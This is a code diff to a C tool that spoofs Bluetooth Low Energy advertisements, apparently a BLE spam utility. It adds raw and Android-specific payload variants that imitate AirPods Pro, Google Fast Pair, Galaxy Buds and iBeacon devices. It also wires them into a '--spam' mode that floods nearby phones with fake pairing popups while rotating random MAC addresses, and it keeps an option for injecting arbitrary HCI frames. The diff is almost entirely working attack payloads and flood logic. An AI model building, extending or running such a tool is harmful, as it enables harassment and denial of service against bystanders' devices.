@@ -35,41 +35,40 @@ static int send_hci_cmd(int fd, const uint8_t *cmd, size_t len, uint8_t *resp, s
 }
 
 // Pre-crafted BLE Advertising Payloads (Max 31 bytes total)
-// 1. Apple AirPods Pro (Flags + Complete Local Name + Apple Proximity Pairing)
-static const uint8_t APPLE_AIRPODS_PRO[] = {
-    // Flags: LE General Discoverable, BR/EDR Not Supported (3 bytes)
-    0x02, 0x01, 0x06,
-    // Complete Local Name: "AirPods Pro" (13 bytes)
-    0x0C, 0x09, 'A', 'i', 'r', 'P', 'o', 'd', 's', ' ', 'P', 'r', 'o',
-    // Apple Continuity Proximity Pairing (15 bytes)
-    0x0E, 0xFF, 0x4C, 0x00, 0x07, 0x09, 0x01, 0x0E, 0x20, 0x55, 0x55, 0x55, 0x00, 0x00, 0x00
+// --- 1. Original RAW Ecosystem Payloads ---
+// Raw Apple Continuity Proximity Pairing (AirPods Pro setup popup for iOS - 30 bytes)
+static const uint8_t APPLE_AIRPODS_PRO_RAW[] = {
+    0x1E, // Length = 30 bytes
+    0xFF, // AD Type: Manufacturer Specific
+    0x4C, 0x00, // Apple Inc. (0x004C)
+    0x07, 0x19, // Type: Proximity Pairing, Len: 25
+    0x01,       // Prefix
+    0x0E, 0x20, // Model: AirPods Pro (0x0E20)
+    0x55,       // Status flags
+    0x55,       // Battery levels (left/right/case)
+    0x55, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
 
-// 2. Google Fast Pair Device (Flags + Complete Local Name + Fast Pair UUID 0xFE2C + Model ID)
-static const uint8_t GOOGLE_FAST_PAIR[] = {
-    // Flags (3 bytes)
-    0x02, 0x01, 0x06,
-    // Complete Local Name: "Pixel Buds" (12 bytes)
-    0x0B, 0x09, 'P', 'i', 'x', 'e', 'l', ' ', 'B', 'u', 'd', 's',
-    // Service UUID 16-bit (4 bytes)
-    0x03, 0x03, 0x2C, 0xFE,
-    // Service Data: Fast Pair 0xFE2C + Model ID (7 bytes)
-    0x06, 0x16, 0x2C, 0xFE, 0x2C, 0x00, 0x00
+// Raw Google Fast Pair Device Announcement (6 bytes)
+static const uint8_t GOOGLE_FAST_PAIR_RAW[] = {
+    0x06, // Length = 6 bytes
+    0x16, // AD Type: Service Data - 16-bit UUID
+    0x2C, 0xFE, // Fast Pair UUID (0xFE2C)
+    0xCD, 0x82, 0x54 // Model ID
 };
 
-// 3. Samsung Galaxy Buds (Flags + Complete Local Name + Samsung Manufacturer Data)
-static const uint8_t SAMSUNG_BUDS[] = {
-    // Flags (3 bytes)
-    0x02, 0x01, 0x06,
-    // Complete Local Name: "Galaxy Buds" (13 bytes)
-    0x0C, 0x09, 'G', 'a', 'l', 'a', 'x', 'y', ' ', 'B', 'u', 'd', 's',
-    // Samsung Electronics Manufacturer Specific Data (14 bytes)
-    0x0D, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00
+// Raw Samsung Galaxy Buds Popup (24 bytes)
+static const uint8_t SAMSUNG_BUDS_RAW[] = {
+    0x18, // Length = 24 bytes
+    0xFF, // AD Type: Manufacturer Specific
+    0x75, 0x00, // Samsung Electronics (0x0075)
+    0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
+    0x2E, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
 };
 
-// 4. Custom iBeacon (Flags + iBeacon Payload)
-static const uint8_t IBEACON_PAYLOAD[] = {
-    0x02, 0x01, 0x06,
+// Raw Apple iBeacon (26 bytes)
+static const uint8_t IBEACON_PAYLOAD_RAW[] = {
     0x1A, // Length = 26 bytes
     0xFF, // Manufacturer Specific
     0x4C, 0x00, // Apple Inc
@@ -79,6 +78,32 @@ static const uint8_t IBEACON_PAYLOAD[] = {
     0x00, 0x01, // Major (1)
     0x00, 0x01, // Minor (1)
     0xC5        // Measured Power (-59 dBm)
+};
+
+// --- 2. Android Compatible Payloads (--andc: Flags + Local Name for Android Pair List) ---
+static const uint8_t APPLE_AIRPODS_PRO_ANDC[] = {
+    0x02, 0x01, 0x06, // Flags
+    0x0C, 0x09, 'A', 'i', 'r', 'P', 'o', 'd', 's', ' ', 'P', 'r', 'o', // Complete Local Name
+    0x0E, 0xFF, 0x4C, 0x00, 0x07, 0x09, 0x01, 0x0E, 0x20, 0x55, 0x55, 0x55, 0x00, 0x00, 0x00
+};
+
+static const uint8_t GOOGLE_FAST_PAIR_ANDC[] = {
+    0x02, 0x01, 0x06, // Flags
+    0x0B, 0x09, 'P', 'i', 'x', 'e', 'l', ' ', 'B', 'u', 'd', 's', // Complete Local Name
+    0x03, 0x03, 0x2C, 0xFE, // Fast Pair UUID 0xFE2C
+    0x06, 0x16, 0x2C, 0xFE, 0x2C, 0x00, 0x00
+};
+
+static const uint8_t SAMSUNG_BUDS_ANDC[] = {
+    0x02, 0x01, 0x06, // Flags
+    0x0C, 0x09, 'G', 'a', 'l', 'a', 'x', 'y', ' ', 'B', 'u', 'd', 's', // Complete Local Name
+    0x0D, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00
+};
+
+static const uint8_t IBEACON_PAYLOAD_ANDC[] = {
+    0x02, 0x01, 0x06, // Flags
+    0x0B, 0x09, 'i', 'B', 'e', 'a', 'c', 'o', 'n', ' ', 'B', 'T', // Complete Local Name
+    0x0E, 0xFF, 0x4C, 0x00, 0x02, 0x15, 0xE2, 0xC5, 0x6D, 0xB5, 0xDF, 0xFB, 0x00, 0x01, 0x00
 };
 
 static void print_banner(void) {
@@ -92,14 +117,15 @@ static void show_help(const char *prog) {
     print_banner();
     printf("Usage: %s [mode] [options]\n\n", prog);
     printf("Modes:\n");
-    printf("  --airpods         Broadcast Apple AirPods Pro (Flags + Name + Proximity)\n");
-    printf("  --fastpair        Broadcast Google Fast Pair (Flags + 'Pixel Buds' + 0xFE2C)\n");
-    printf("  --samsung         Broadcast Samsung Galaxy Buds (Flags + Name + Buds data)\n");
+    printf("  --airpods         Broadcast Apple AirPods Pro pairing prompt\n");
+    printf("  --fastpair        Broadcast Google Fast Pair device announcement\n");
+    printf("  --samsung         Broadcast Samsung Galaxy Buds pairing notification\n");
     printf("  --ibeacon         Broadcast standard Apple iBeacon advertisement\n");
     printf("  --name <str>      Broadcast custom device name in pairing list\n");
     printf("  --custom <hex>    Inject arbitrary raw HCI command frame in hex\n");
     printf("  --spam            Continuous rotating multi-vector BLE popup & pair flood\n\n");
     printf("Options:\n");
+    printf("  --andc            Android compatible mode (appends Flags & Name for Android Pair list)\n");
     printf("  -i, --interval    Beacon transmission interval in ms (default: 50)\n");
     printf("  -d, --duration    Duration in seconds (default: 15, 0 = infinite)\n");
     printf("  -h, --help        Show this help message\n\n");
@@ -161,6 +187,7 @@ int main(int argc, char **argv) {
     }
 
     int mode = 0; // 1=airpods, 2=fastpair, 3=samsung, 4=ibeacon, 5=custom, 6=spam, 7=name
+    int android_compat = 0;
     int interval_ms = 50;
     int duration_sec = 15;
     const char *custom_hex = NULL;
@@ -172,6 +199,7 @@ int main(int argc, char **argv) {
         else if (!strcmp(argv[i], "--samsung")) mode = 3;
         else if (!strcmp(argv[i], "--ibeacon")) mode = 4;
         else if (!strcmp(argv[i], "--spam")) mode = 6;
+        else if (!strcmp(argv[i], "--andc")) android_compat = 1;
         else if (!strcmp(argv[i], "--name") && i + 1 < argc) { mode = 7; dev_name = argv[++i]; }
         else if (!strcmp(argv[i], "--custom") && i + 1 < argc) { mode = 5; custom_hex = argv[++i]; }
         else if (!strcmp(argv[i], "-i") && i + 1 < argc) interval_ms = atoi(argv[++i]);
@@ -192,6 +220,9 @@ int main(int argc, char **argv) {
         return 1;
     }
     printf("\033[1;32m[+] Radio online (WMT power enabled).\033[0m\n");
+    if (android_compat) {
+        printf("\033[1;36m[+] Android Compatibility Mode (--andc) Active: Flags + Device Names Enabled.\033[0m\n");
+    }
 
     signal(SIGINT, sig_handler);
     signal(SIGTERM, sig_handler);
@@ -225,6 +256,7 @@ int main(int argc, char **argv) {
     } else if (mode == 6) {
         // Multi-vector flood (rotates MAC every burst)
         printf("[*] Starting Multi-Vector BLE Popup Flood Engine...\n");
+        printf("[*] Mode: %s\n", android_compat ? "Android-Compatible (with Flags & Device Names)" : "Raw Protocol Frames");
         printf("[*] Burst Interval: %d ms | Duration: %d seconds\n\n", interval_ms, duration_sec);
 
         time_t start_time = time(NULL);
@@ -236,10 +268,17 @@ int main(int argc, char **argv) {
             set_random_mac(fd, rx_buf);
 
             int sub = (tx_bursts % 4) + 1;
-            if (sub == 1) inject_adv_data(fd, APPLE_AIRPODS_PRO, sizeof(APPLE_AIRPODS_PRO), rx_buf);
-            else if (sub == 2) inject_adv_data(fd, GOOGLE_FAST_PAIR, sizeof(GOOGLE_FAST_PAIR), rx_buf);
-            else if (sub == 3) inject_adv_data(fd, SAMSUNG_BUDS, sizeof(SAMSUNG_BUDS), rx_buf);
-            else inject_adv_data(fd, IBEACON_PAYLOAD, sizeof(IBEACON_PAYLOAD), rx_buf);
+            if (android_compat) {
+                if (sub == 1) inject_adv_data(fd, APPLE_AIRPODS_PRO_ANDC, sizeof(APPLE_AIRPODS_PRO_ANDC), rx_buf);
+                else if (sub == 2) inject_adv_data(fd, GOOGLE_FAST_PAIR_ANDC, sizeof(GOOGLE_FAST_PAIR_ANDC), rx_buf);
+                else if (sub == 3) inject_adv_data(fd, SAMSUNG_BUDS_ANDC, sizeof(SAMSUNG_BUDS_ANDC), rx_buf);
+                else inject_adv_data(fd, IBEACON_PAYLOAD_ANDC, sizeof(IBEACON_PAYLOAD_ANDC), rx_buf);
+            } else {
+                if (sub == 1) inject_adv_data(fd, APPLE_AIRPODS_PRO_RAW, sizeof(APPLE_AIRPODS_PRO_RAW), rx_buf);
+                else if (sub == 2) inject_adv_data(fd, GOOGLE_FAST_PAIR_RAW, sizeof(GOOGLE_FAST_PAIR_RAW), rx_buf);
+                else if (sub == 3) inject_adv_data(fd, SAMSUNG_BUDS_RAW, sizeof(SAMSUNG_BUDS_RAW), rx_buf);
+                else inject_adv_data(fd, IBEACON_PAYLOAD_RAW, sizeof(IBEACON_PAYLOAD_RAW), rx_buf);
+            }
 
             printf("\r\033[1;31m[MULTI-VECTOR #%llu]\033[0m Dispatched Rotating BLE Vector (%s) ", 
                 (unsigned long long)++tx_bursts, sub==1?"Apple AirPods":sub==2?"Pixel Buds":sub==3?"Galaxy Buds":"iBeacon");
@@ -256,21 +295,21 @@ int main(int argc, char **argv) {
         uint8_t custom_name_buf[32];
 
         if (mode == 1) {
-            payload = APPLE_AIRPODS_PRO;
-            plen = sizeof(APPLE_AIRPODS_PRO);
-            printf("[*] Mode: Apple AirPods Pro (Flags + 'AirPods Pro' + Proximity Pairing)\n");
+            payload = android_compat ? APPLE_AIRPODS_PRO_ANDC : APPLE_AIRPODS_PRO_RAW;
+            plen = android_compat ? sizeof(APPLE_AIRPODS_PRO_ANDC) : sizeof(APPLE_AIRPODS_PRO_RAW);
+            printf("[*] Mode: Apple AirPods Pro (%s)\n", android_compat ? "Android Compatible: Flags + Name + Proximity" : "Raw iOS Proximity Pairing Frame");
         } else if (mode == 2) {
-            payload = GOOGLE_FAST_PAIR;
-            plen = sizeof(GOOGLE_FAST_PAIR);
-            printf("[*] Mode: Google Fast Pair (Flags + 'Pixel Buds' + Fast Pair UUID 0xFE2C)\n");
+            payload = android_compat ? GOOGLE_FAST_PAIR_ANDC : GOOGLE_FAST_PAIR_RAW;
+            plen = android_compat ? sizeof(GOOGLE_FAST_PAIR_ANDC) : sizeof(GOOGLE_FAST_PAIR_RAW);
+            printf("[*] Mode: Google Fast Pair (%s)\n", android_compat ? "Android Compatible: Flags + Name + UUID" : "Raw Fast Pair Service Data");
         } else if (mode == 3) {
-            payload = SAMSUNG_BUDS;
-            plen = sizeof(SAMSUNG_BUDS);
-            printf("[*] Mode: Samsung Galaxy Buds (Flags + 'Galaxy Buds' + Buds Data)\n");
+            payload = android_compat ? SAMSUNG_BUDS_ANDC : SAMSUNG_BUDS_RAW;
+            plen = android_compat ? sizeof(SAMSUNG_BUDS_ANDC) : sizeof(SAMSUNG_BUDS_RAW);
+            printf("[*] Mode: Samsung Galaxy Buds (%s)\n", android_compat ? "Android Compatible: Flags + Name + Buds Data" : "Raw Samsung Buds Frame");
         } else if (mode == 4) {
-            payload = IBEACON_PAYLOAD;
-            plen = sizeof(IBEACON_PAYLOAD);
-            printf("[*] Mode: Apple iBeacon Advertisement\n");
+            payload = android_compat ? IBEACON_PAYLOAD_ANDC : IBEACON_PAYLOAD_RAW;
+            plen = android_compat ? sizeof(IBEACON_PAYLOAD_ANDC) : sizeof(IBEACON_PAYLOAD_RAW);
+            printf("[*] Mode: Apple iBeacon (%s)\n", android_compat ? "Android Compatible" : "Raw iBeacon Frame");
         } else if (mode == 7) {
             // Build custom name payload
             // Flags (3 bytes) + Complete Local Name (len + 1)
